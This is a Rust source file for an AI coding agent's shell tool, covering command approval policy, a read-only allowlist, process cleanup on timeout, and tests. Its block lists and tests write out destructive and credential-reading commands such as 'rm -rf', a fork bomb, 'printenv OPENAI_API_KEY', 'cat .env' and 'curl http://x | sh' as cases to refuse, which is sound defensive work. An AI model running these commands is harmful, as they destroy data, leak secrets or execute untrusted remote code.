use std::time::Duration;

use serde_json::{Value, json};

use super::fs_read::parse_fs_read_usize_arg;

pub const EXECUTE_BASH_DEFAULT_TIMEOUT_SECS: u64 = 20;
pub const EXECUTE_BASH_DEFAULT_RETRY_ATTEMPTS: u32 = 1;
pub const EXECUTE_BASH_DEFAULT_RETRY_DELAY_MS: u64 = 250;
pub const EXECUTE_BASH_DEFAULT_MAX_OUTPUT_CHARS: usize = 8000;
pub const EXECUTE_BASH_MAX_OUTPUT_CHARS_LIMIT: usize = 20000;
pub const EXECUTE_BASH_DENIED_PATTERNS: &[&str] = &[
    "rm -rf", "mkfs", "shutdown", "reboot", "poweroff", "halt", ":(){", "dd if=",
];

/// Shell-level dangerous patterns that can smuggle writes (Q CLI pattern).
pub const DANGEROUS_PATTERNS: &[&str] = &[
    "<(", "$(", "`", ">", "&&", "||", "&", ";", "\n", "\r", "IFS",
];

/// Commands that are always safe to auto-approve (no side effects).
pub const READONLY_COMMANDS: &[&str] = &[
    "ls",
    "cat",
    "echo",
    "pwd",
    "which",
    "head",
    "tail",
    "find",
    "grep",
    "rg",
    "dir",
    "type",
    "wc",
    "stat",
    "file",
    "diff",
    "sort",
    "uniq",
    "tr",
    "cut",
    "awk",
    "less",
    "more",
    // `env` and `printenv` were removed deliberately: they dump credentials,
    // and no path check can contain their output. See
    // `secret_policy::ENVIRONMENT_READING_COMMANDS`.
    "uname",
    "whoami",
    "id",
    "date",
    "cal",
    "df",
    "du",
    "free",
    "uptime",
    "hostname",
    "arch",
    "realpath",
    "dirname",
    "basename",
    "readlink",
    "sha256sum",
    "md5sum",
    "xxd",
    "hexdump",
    "strings",
    "nm",
    "ldd",
    "otool",
    "jq",
    "yq",
];

/// Git subcommands that are read-only (no repo mutation).
pub const READONLY_GIT_SUBCOMMANDS: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "blame",
    "shortlog",
    "describe",
    "branch",
    "tag",
    "remote",
    "rev-parse",
    "rev-list",
    "name-rev",
    "for-each-ref",
    "symbolic-ref",
    "ls-files",
    "ls-tree",
    "ls-remote",
    "cat-file",
    "diff-tree",
    "diff-files",
    "diff-index",
    "config",
    "stash",
    "reflog",
    "whatchanged",
    "cherry",
    "merge-base",
    "grep",
    "count-objects",
    "fsck",
    "verify-pack",
    "help",
    "version",
];
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExecuteBashRequest {
    pub command: String,
    pub approved: bool,
    pub allow_dangerous: bool,
    pub timeout_secs: u64,
    pub retry_attempts: u32,
    pub retry_delay_ms: u64,
    pub max_output_chars: usize,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExecuteBashToolError {
    pub code: &'static str,
    pub message: String,
}

impl ExecuteBashToolError {
    fn new(code: &'static str, message: impl Into<String>) -> Self {
        Self {
            code,
            message: message.into(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExecuteBashPolicyDecision {
    pub read_only_auto_allow: bool,
}

pub fn execute_bash_error_payload(
    command: &str,
    err: ExecuteBashToolError,
    attempts: u32,
) -> Value {
    json!({
        "status": "error",
        "kind": "execute_bash",
        "code": err.code,
        "error": err.message,
        "command": command,
        "attempts": attempts
    })
}

pub fn parse_execute_bash_u64_arg(
    args: &Value,
    key: &str,
    default: u64,
    min: u64,
    max: u64,
) -> Result<u64, ExecuteBashToolError> {
    let Some(value) = args.get(key) else {
        return Ok(default);
    };
    let Some(parsed) = value.as_u64() else {
        return Err(ExecuteBashToolError::new(
            "invalid_args",
            format!("'{key}' must be a positive integer"),
        ));
    };
    if parsed < min || parsed > max {
        return Err(ExecuteBashToolError::new(
            "invalid_args",
            format!("'{key}' must be between {min} and {max}"),
        ));
    }
    Ok(parsed)
}

pub fn parse_execute_bash_request(
    args: &Value,
) -> Result<ExecuteBashRequest, ExecuteBashToolError> {
    let command = args
        .get("command")
        .and_then(Value::as_str)
        .map(str::trim)
        .unwrap_or_default()
        .to_string();
    if command.is_empty() {
        return Err(ExecuteBashToolError::new(
            "invalid_args",
            "'command' is required for execute_bash",
        ));
    }

    let max_output_chars = parse_fs_read_usize_arg(
        args,
        "max_output_chars",
        EXECUTE_BASH_DEFAULT_MAX_OUTPUT_CHARS,
        128,
        EXECUTE_BASH_MAX_OUTPUT_CHARS_LIMIT,
    )
    .map_err(|err| ExecuteBashToolError::new(err.code, err.message))?;

    Ok(ExecuteBashRequest {
        command,
        approved: args
            .get("approved")
            .and_then(Value::as_bool)
            .unwrap_or(false),
        allow_dangerous: args
            .get("allow_dangerous")
            .and_then(Value::as_bool)
            .unwrap_or(false),
        timeout_secs: parse_execute_bash_u64_arg(
            args,
            "timeout_secs",
            EXECUTE_BASH_DEFAULT_TIMEOUT_SECS,
            1,
            120,
        )?,
        retry_attempts: parse_execute_bash_u64_arg(
            args,
            "retry_attempts",
            EXECUTE_BASH_DEFAULT_RETRY_ATTEMPTS as u64,
            1,
            5,
        )? as u32,
        retry_delay_ms: parse_execute_bash_u64_arg(
            args,
            "retry_delay_ms",
            EXECUTE_BASH_DEFAULT_RETRY_DELAY_MS,
            0,
            5000,
        )?,
        max_output_chars,
    })
}

pub fn is_read_only_command(command: &str) -> bool {
    let trimmed = command.trim();
    if trimmed.is_empty() || trimmed.contains('\n') || trimmed.contains('\r') {
        return false;
    }

    // Containment first: a command may be read-only in the sense of not
    // mutating anything and still exfiltrate a credential. `cat .env` is the
    // canonical case. `fs_read` refuses those paths, so the shell fast path
    // must refuse them too, or the two subsystems disagree about the same
    // secret. Requirement 7.4, 7.5; Property 6.
    if !crate::tools::secret_policy::scan_command(trimmed).is_contained() {
        return false;
    }

    // Split by shell words; if shlex fails, treat as unsafe.
    let Some(args) = shlex::split(trimmed) else {
        return false;
    };

    // Reject any token containing dangerous patterns.
    if args
        .iter()
        .any(|a| DANGEROUS_PATTERNS.iter().any(|p| a.contains(p)))
    {
        return false;
    }

    // Split on pipes and check each command in the chain.
    let mut current: Vec<&str> = Vec::new();
    let mut commands: Vec<Vec<&str>> = Vec::new();
    for arg in &args {
        if arg == "|" {
            if !current.is_empty() {
                commands.push(current);
            }
            current = Vec::new();
        } else if arg.contains('|') {
            // Pipe embedded in token without spacing — unsafe.
            return false;
        } else {
            current.push(arg);
        }
    }
    if !current.is_empty() {
        commands.push(current);
    }

    for cmd_args in &commands {
        let Some(cmd) = cmd_args.first() else {
            return false;
        };

        // `find` with mutation flags is unsafe.
        if *cmd == "find"
            && cmd_args.iter().any(|a| {
                a.contains("-exec")
                    || a.contains("-delete")
                    || a.contains("-ok")
                    || a.contains("-fprint")
                    || a.contains("-fls")
            })
        {
            return false;
        }

        // `grep -P` (perl regex) has RCE risk.
        if *cmd == "grep" && cmd_args.iter().any(|a| *a == "-P" || *a == "--perl-regexp") {
            return false;
        }

        // git: check subcommand against readonly list.
        if *cmd == "git" {
            if let Some(sub) = cmd_args.get(1) {
                if !READONLY_GIT_SUBCOMMANDS.contains(sub) {
                    return false;
                }
                // git stash: only "list" and "show" are readonly.
                if *sub == "stash" {
                    let action = cmd_args.get(2).map(|s| s.as_ref()).unwrap_or("list");
                    if action != "list" && action != "show" {
                        return false;
                    }
                }
                // git config: only without --set/--unset/--add/--remove.
                if *sub == "config"
                    && cmd_args.iter().any(|a| {
                        a.starts_with("--set")
                            || a.starts_with("--unset")
                            || a.starts_with("--add")
                            || a.starts_with("--remove")
                            || a.starts_with("--replace")
                    })
                {
                    return false;
                }
                continue;
            }
            return false; // bare `git` with no subcommand
        }

        if !READONLY_COMMANDS.contains(cmd) {
            return false;
        }
    }

    true
}

pub fn contains_command_chaining(command: &str) -> bool {
    DANGEROUS_PATTERNS.iter().any(|p| command.contains(p))
}

pub fn matched_denied_pattern(command: &str) -> Option<&'static str> {
    let normalized = command.trim().to_ascii_lowercase();
    EXECUTE_BASH_DENIED_PATTERNS
        .iter()
        .copied()
        .find(|pattern| normalized.contains(pattern))
}

pub fn evaluate_execute_bash_policy(
    request: &ExecuteBashRequest,
) -> Result<ExecuteBashPolicyDecision, ExecuteBashToolError> {
    // Read-only fast path first. `is_read_only_command` is itself strict — it
    // rejects newlines, dangerous tokens, non-allowlisted binaries, mutating
    // git subcommands, and (since the containment fix) any argument that
    // `fs_read` would refuse. Running it before the escalation pipeline means
    // `ls | wc -l` and `git log --oneline | head` stop asking for approval just
    // for containing a pipe, without widening what counts as read-only.
    // Requirement 8.7; Correctness Property 10.
    if is_read_only_command(&request.command) {
        return Ok(ExecuteBashPolicyDecision {
            read_only_auto_allow: true,
        });
    }

    // Everything else goes through security validation.
    match super::bash_security::validate_bash_command(&request.command) {
        super::bash_security::SecurityResult::Deny(reason) => {
            if !request.allow_dangerous {
                return Err(ExecuteBashToolError::new(
                    "denied_command",
                    format!(
                        "execute_bash denied: {}. Set allow_dangerous=true and approved=true to override.",
                        reason
                    ),
                ));
            }
            if !request.approved {
                return Err(ExecuteBashToolError::new(
                    "approval_required",
                    format!("execute_bash requires approved=true: {}", reason),
                ));
            }
            return Ok(ExecuteBashPolicyDecision {
                read_only_auto_allow: false,
            });
        }
        super::bash_security::SecurityResult::Ask(reason) => {
            if !request.approved {
                return Err(ExecuteBashToolError::new(
                    "approval_required",
                    format!("execute_bash requires approval: {}", reason),
                ));
            }
        }
        super::bash_security::SecurityResult::Allow(_) => {
            return Ok(ExecuteBashPolicyDecision {
                read_only_auto_allow: true,
            });
        }
        super::bash_security::SecurityResult::Passthrough => {}
    }

    // Legacy denied patterns (kept for backward compat, catches rm -rf etc.)
    if let Some(pattern) = matched_denied_pattern(&request.command) {
        if !request.allow_dangerous {
            return Err(ExecuteBashToolError::new(
                "denied_command",
                format!(
                    "execute_bash denied command due to blocked pattern '{pattern}'. Set allow_dangerous=true and approved=true to override."
                ),
            ));
        }
        if !request.approved {
            return Err(ExecuteBashToolError::new(
                "approval_required",
                "execute_bash requires approved=true for dangerous command override",
            ));
        }
        return Ok(ExecuteBashPolicyDecision {
            read_only_auto_allow: false,
        });
    }

    if is_read_only_command(&request.command) {
        return Ok(ExecuteBashPolicyDecision {
            read_only_auto_allow: true,
        });
    }

    if !request.approved {
        return Err(ExecuteBashToolError::new(
            "approval_required",
            "execute_bash requires approved=true for non-read-only commands",
        ));
    }

    Ok(ExecuteBashPolicyDecision {
        read_only_auto_allow: false,
    })
}

pub fn truncate_text(text: &str, max_chars: usize) -> (String, bool) {
    let mut iter = text.chars();
    let truncated = iter.by_ref().take(max_chars).collect::<String>();
    if iter.next().is_some() {
        (truncated, true)
    } else {
        (text.to_string(), false)
    }
}

/// Kills a process group when dropped.
///
/// The timeout branch can kill explicitly, but cancellation cannot: when the
/// Workspace aborts a turn the future is dropped without running any of its
/// remaining code. `kill_on_drop` reaps the direct `sh` process, and this guard
/// reaps everything `sh` started, so Esc and a timeout leave the machine in the
/// same state. Requirement 4.9, 8.5.
struct ProcessGroupGuard {
    pgid: Option<u32>,
}

impl ProcessGroupGuard {
    fn new(pgid: Option<u32>) -> Self {
        Self { pgid }
    }

    /// Disarm after a clean exit; there is nothing left to kill.
    fn disarm(&mut self) {
        self.pgid = None;
    }
}

impl Drop for ProcessGroupGuard {
    fn drop(&mut self) {
        #[cfg(unix)]
        if let Some(pgid) = self.pgid {
            unsafe {
                libc::kill(-(pgid as i32), libc::SIGKILL);
            }
        }
    }
}

/// Terminate a child and everything it spawned.
///
/// Killing only the direct child leaves grandchildren running: `sh -c "sleep 60 &"`
/// returns immediately while the sleep survives. The child is spawned into its
/// own process group so the whole tree can be signalled at once.
#[cfg(unix)]
fn kill_process_tree(child: &tokio::process::Child) {
    if let Some(pid) = child.id() {
        // Negative pid targets the process group. SIGKILL rather than SIGTERM:
        // the command has already exceeded its deadline, and a handler that
        // ignores SIGTERM would keep it alive past the tool's return.
        unsafe {
            libc::kill(-(pid as i32), libc::SIGKILL);
        }
    }
}

#[cfg(not(unix))]
fn kill_process_tree(_child: &tokio::process::Child) {
    // `kill_on_drop` handles the direct child on other platforms.
}

pub async fn run_execute_bash_once(
    command: &str,
    timeout_secs: u64,
) -> Result<std::process::Output, ExecuteBashToolError> {
    use tokio::io::AsyncReadExt;

    let mut builder = tokio::process::Command::new("sh");
    builder
        // `-c`, not `-lc`. A login shell sources the user's profile, which can
        // reset PATH and LD_PRELOAD — exactly the environment manipulation the
        // security validators refuse to allow in the command itself.
        .arg("-c")
        .arg(command)
        // Without this, a dropped future leaves the process running while the
        // tool reports a timeout.
        .kill_on_drop(true)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());

    #[cfg(unix)]
    {
        // Own process group, so the timeout path can reap grandchildren.
        builder.process_group(0);
    }

    let mut child = builder
        .spawn()
        .map_err(|_| ExecuteBashToolError::new("io_error", "failed to launch shell command"))?;

    // Armed for every exit path, including cancellation.
    let mut group_guard = ProcessGroupGuard::new(child.id());

    // Drain the pipes concurrently. A command that fills the pipe buffer would
    // otherwise block forever waiting for a reader that never runs, and the
    // timeout would fire on a process that was only ever starved.
    let mut stdout_pipe = child.stdout.take();
    let mut stderr_pipe = child.stderr.take();
    let stdout_reader = tokio::spawn(async move {
        let mut buffer = Vec::new();
        if let Some(pipe) = stdout_pipe.as_mut() {
            let _ = pipe.read_to_end(&mut buffer).await;
        }
        buffer
    });
    let stderr_reader = tokio::spawn(async move {
        let mut buffer = Vec::new();
        if let Some(pipe) = stderr_pipe.as_mut() {
            let _ = pipe.read_to_end(&mut buffer).await;
        }
        buffer
    });

    // `wait` borrows rather than consumes, so the handle survives the timeout
    // branch and the tree can actually be killed before returning.
    let status = match tokio::time::timeout(Duration::from_secs(timeout_secs), child.wait()).await {
        Ok(Ok(status)) => status,
        Ok(Err(_)) => {
            return Err(ExecuteBashToolError::new(
                "io_error",
                "failed to launch shell command",
            ));
        }
        Err(_) => {
            // Kill before returning, so "timed out" is a true statement about
            // the state of the machine and not just about this future.
            kill_process_tree(&child);
            let _ = child.kill().await;
            stdout_reader.abort();
            stderr_reader.abort();
            return Err(ExecuteBashToolError::new(
                "timeout",
                format!("command timed out after {timeout_secs}s"),
            ));
        }
    };

    // Exited on its own; nothing left to reap.
    group_guard.disarm();

    let stdout = stdout_reader.await.unwrap_or_default();
    let stderr = stderr_reader.await.unwrap_or_default();

    Ok(std::process::Output {
        status,
        stdout,
        stderr,
    })
}

pub fn execute_bash_output_payload(
    request: &ExecuteBashRequest,
    policy: &ExecuteBashPolicyDecision,
    attempts: u32,
    output: std::process::Output,
) -> Value {
    let stdout_text = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr_text = String::from_utf8_lossy(&output.stderr).to_string();
    let (stdout, stdout_truncated) = truncate_text(&stdout_text, request.max_output_chars);
    let (stderr, stderr_truncated) = truncate_text(&stderr_text, request.max_output_chars);

    if output.status.success() {
        return json!({
            "status": "ok",
            "kind": "execute_bash",
            "command": request.command,
            "attempts": attempts,
            "exit_code": output.status.code().unwrap_or(0),
            "read_only_auto_allow": policy.read_only_auto_allow,
            "stdout": stdout,
            "stderr": stderr,
            "stdout_truncated": stdout_truncated,
            "stderr_truncated": stderr_truncated
        });
    }

    json!({
        "status": "error",
        "kind": "execute_bash",
        "code": "command_failed",
        "error": format!("command exited with non-zero status: {}", output.status),
        "command": request.command,
        "attempts": attempts,
        "exit_code": output.status.code().unwrap_or(-1),
        "read_only_auto_allow": policy.read_only_auto_allow,
        "stdout": stdout,
        "stderr": stderr,
        "stdout_truncated": stdout_truncated,
        "stderr_truncated": stderr_truncated
    })
}

pub async fn execute_bash_tool_response(args: &Value) -> Value {
    let request = match parse_execute_bash_request(args) {
        Ok(request) => request,
        Err(err) => return execute_bash_error_payload("<missing>", err, 0),
    };
    let policy = match evaluate_execute_bash_policy(&request) {
        Ok(decision) => decision,
        Err(err) => return execute_bash_error_payload(&request.command, err, 0),
    };

    let mut attempts = 0u32;
    let mut last_error: Option<ExecuteBashToolError> = None;

    while attempts < request.retry_attempts {
        attempts += 1;
        match run_execute_bash_once(&request.command, request.timeout_secs).await {
            Ok(output) => {
                let payload = execute_bash_output_payload(&request, &policy, attempts, output);
                let failed = payload
                    .get("status")
                    .and_then(Value::as_str)
                    .map(|status| status.eq_ignore_ascii_case("error"))
                    .unwrap_or(false);
                if !failed || attempts >= request.retry_attempts {
                    return payload;
                }
                last_error = Some(ExecuteBashToolError::new(
                    "command_failed",
                    payload
                        .get("error")
                        .and_then(Value::as_str)
                        .unwrap_or("command failed"),
                ));
            }
            Err(err) => {
                // A timeout must not be retried. The process was killed, but
                // the work it had already done is not undone, so re-running a
                // non-idempotent command would apply it twice. Requirement 8.6.
                if err.code == "timeout" {
                    return execute_bash_error_payload(&request.command, err, attempts);
                }
                last_error = Some(err);
            }
        }

        if attempts < request.retry_attempts && request.retry_delay_ms > 0 {
            tokio::time::sleep(Duration::from_millis(request.retry_delay_ms)).await;
        }
    }

    execute_bash_error_payload(
        &request.command,
        last_error.unwrap_or_else(|| {
            ExecuteBashToolError::new("internal_error", "execute_bash failed unexpectedly")
        }),
        attempts,
    )
}

#[cfg(test)]
mod containment_tests {
    use super::*;

    /// Property 6: a command is not read-only merely because it does not
    /// mutate anything. `cat .env` exfiltrates a credential that `fs_read`
    /// refuses, so the shell fast path must refuse it too.
    #[test]
    fn reading_a_denied_file_is_not_read_only() {
        assert!(!is_read_only_command("cat .env"));
        assert!(!is_read_only_command("cat ./.env"));
        assert!(!is_read_only_command("cat docs/../.env"));
        assert!(!is_read_only_command("cat .env.production"));
        assert!(!is_read_only_command("head -n 5 .env.local"));
        assert!(!is_read_only_command("strings .env"));
        assert!(!is_read_only_command("xxd .git/index"));
        assert!(!is_read_only_command("cat .zavora/config.toml"));
    }

    /// Property 6: no auto-approved command may print the environment.
    #[test]
    fn environment_dumping_commands_are_never_read_only() {
        assert!(!is_read_only_command("env"));
        assert!(!is_read_only_command("printenv"));
        assert!(!is_read_only_command("printenv OPENAI_API_KEY"));
        assert!(!is_read_only_command("/usr/bin/env"));
        assert!(!READONLY_COMMANDS.contains(&"env"));
        assert!(!READONLY_COMMANDS.contains(&"printenv"));
    }

    #[test]
    fn ordinary_read_only_commands_still_pass() {
        assert!(is_read_only_command("ls -la"));
        assert!(is_read_only_command("cat README.md"));
        assert!(is_read_only_command("git status"));
        assert!(is_read_only_command("wc -l src/main.rs"));
    }

    /// Property 6, negative side: containment must not swallow legitimate
    /// files whose names merely resemble a denied one.
    #[test]
    fn similar_file_names_remain_readable() {
        assert!(is_read_only_command("cat .envrc"));
        assert!(is_read_only_command("cat notes/environment.md"));
    }
}

#[cfg(test)]
mod lifecycle_tests {
    use super::*;

    /// Property 8: after a timeout, nothing the command started is still alive.
    ///
    /// The command writes a marker file after sleeping. If the process survived
    /// the timeout, the marker appears; a dead process cannot write it.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_timed_out_command_leaves_no_surviving_process() {
        let dir = tempfile::tempdir().expect("tempdir");
        let marker = dir.path().join("survived");
        let command = format!("sleep 3; touch {}", marker.display());

        let error = run_execute_bash_once(&command, 1)
            .await
            .expect_err("command should time out");
        assert_eq!(error.code, "timeout", "{error:?}");

        // Well past the command's own sleep. If the process outlived the tool,
        // the marker exists by now.
        tokio::time::sleep(Duration::from_secs(4)).await;
        assert!(
            !marker.exists(),
            "the timed-out process survived and wrote {}",
            marker.display()
        );
    }

    /// Property 8: grandchildren are reaped too. `sh -c "cmd &"` returns
    /// immediately, so killing only the direct child would leak the background
    /// job.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_backgrounded_grandchild_is_reaped() {
        let dir = tempfile::tempdir().expect("tempdir");
        let marker = dir.path().join("grandchild");
        // The outer shell stays alive so the tool times out; the inner job is a
        // separate process in the same group.
        let command = format!("(sleep 2; touch {}) & sleep 5", marker.display());

        let error = run_execute_bash_once(&command, 1)
            .await
            .expect_err("command should time out");
        assert_eq!(error.code, "timeout");

        tokio::time::sleep(Duration::from_secs(3)).await;
        assert!(
            !marker.exists(),
            "a backgrounded grandchild survived and wrote {}",
            marker.display()
        );
    }

    /// Property 9: a timed-out command runs exactly once, even with retries
    /// configured. Each attempt appends a line; the file must have one.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_timed_out_command_is_not_retried() {
        let dir = tempfile::tempdir().expect("tempdir");
        let ledger = dir.path().join("attempts");
        let command = format!("echo attempt >> {}; sleep 3", ledger.display());

        let args = json!({
            "command": command,
            "approved": true,
            "timeout_secs": 1,
            "retry_attempts": 3,
            "retry_delay_ms": 0
        });

        let response = execute_bash_tool_response(&args).await;
        assert_eq!(
            response.get("code").and_then(Value::as_str),
            Some("timeout"),
            "{response}"
        );
        assert_eq!(
            response.get("attempts").and_then(Value::as_u64),
            Some(1),
            "a timed-out command was retried: {response}"
        );

        let recorded = std::fs::read_to_string(&ledger).unwrap_or_default();
        assert_eq!(
            recorded.lines().count(),
            1,
            "command body ran more than once: {recorded:?}"
        );
    }

    /// A successful command still returns its output through the new pipe
    /// draining path.
    #[tokio::test]
    async fn a_successful_command_returns_its_output() {
        let output = run_execute_bash_once("echo hello", 10)
            .await
            .expect("command should succeed");
        assert!(output.status.success());
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "hello");
    }

    /// Output larger than a pipe buffer must not deadlock. 256 KiB exceeds the
    /// typical 64 KiB pipe capacity, so this fails if the pipes are not drained
    /// concurrently with the wait.
    #[tokio::test]
    async fn large_output_does_not_deadlock() {
        let output = run_execute_bash_once("head -c 262144 /dev/zero | tr '\\0' 'x'", 20)
            .await
            .expect("command should succeed");
        assert!(output.status.success());
        assert_eq!(output.stdout.len(), 262_144);
    }

    /// Property 8, cancellation side: aborting the task must reap the tree too,
    /// not just the direct child. This is the Esc path in the Workspace.
    #[cfg(unix)]
    #[tokio::test]
    async fn cancelling_a_command_leaves_no_surviving_process() {
        let dir = tempfile::tempdir().expect("tempdir");
        let marker = dir.path().join("cancel_survived");
        let command = format!("(sleep 2; touch {}) & sleep 5", marker.display());

        let handle = tokio::spawn(async move { run_execute_bash_once(&command, 30).await });
        // Let the shell start and spawn its background job.
        tokio::time::sleep(Duration::from_millis(400)).await;
        handle.abort();
        let _ = handle.await;

        tokio::time::sleep(Duration::from_secs(3)).await;
        assert!(
            !marker.exists(),
            "a cancelled command's grandchild survived and wrote {}",
            marker.display()
        );
    }

    /// A non-login shell must not source the user's profile, which is what
    /// makes the PATH and LD_PRELOAD validators meaningful.
    #[tokio::test]
    async fn the_shell_is_not_a_login_shell() {
        // `$-` contains 'l' for a login shell. `sh -c` must not.
        let output =
            run_execute_bash_once("case \"$-\" in *l*) echo login;; *) echo plain;; esac", 10)
                .await
                .expect("command should succeed");
        assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "plain");
    }
}

#[cfg(test)]
mod fast_path_order_tests {
    use super::*;

    fn request(command: &str) -> ExecuteBashRequest {
        parse_execute_bash_request(&json!({ "command": command })).expect("valid request")
    }

    /// Property 10: a read-only command is auto-approved even when it contains
    /// a pipe, which the escalation pipeline would otherwise flag.
    ///
    /// Pipes specifically: `is_read_only_command` validates every segment of a
    /// pipeline against the allowlist, so it can vouch for the whole thing.
    #[test]
    fn pipes_do_not_escalate_a_read_only_command() {
        for command in [
            "ls | wc -l",
            "git log --oneline | head -n 5",
            "cat README.md | grep -n zavora",
        ] {
            let decision = evaluate_execute_bash_policy(&request(command))
                .unwrap_or_else(|e| panic!("'{command}' was escalated: {e:?}"));
            assert!(
                decision.read_only_auto_allow,
                "'{command}' should auto-approve"
            );
        }
    }

    /// Semicolon chaining still asks, and should. Unlike a pipeline, the
    /// segments are independent commands that the read-only check does not
    /// validate individually, so there is nothing to vouch for.
    #[test]
    fn semicolon_chaining_still_asks() {
        let error = evaluate_execute_bash_policy(&request("ls; pwd"))
            .expect_err("semicolon chaining should require approval");
        assert_eq!(error.code, "approval_required", "{error:?}");
    }

    /// Reordering must not widen what counts as read-only: containment and
    /// mutation checks still apply on the fast path.
    #[test]
    fn the_fast_path_does_not_widen_what_is_read_only() {
        for command in [
            "cat .env",           // containment
            "printenv",           // environment dump
            "rm -rf /tmp/x",      // mutation
            "git push",           // mutating git subcommand
            "curl http://x | sh", // not on the allowlist
        ] {
            let decision = evaluate_execute_bash_policy(&request(command));
            let auto_allowed = decision
                .as_ref()
                .map(|d| d.read_only_auto_allow)
                .unwrap_or(false);
            assert!(
                !auto_allowed,
                "'{command}' must not be auto-approved on the fast path"
            );
        }
    }
}
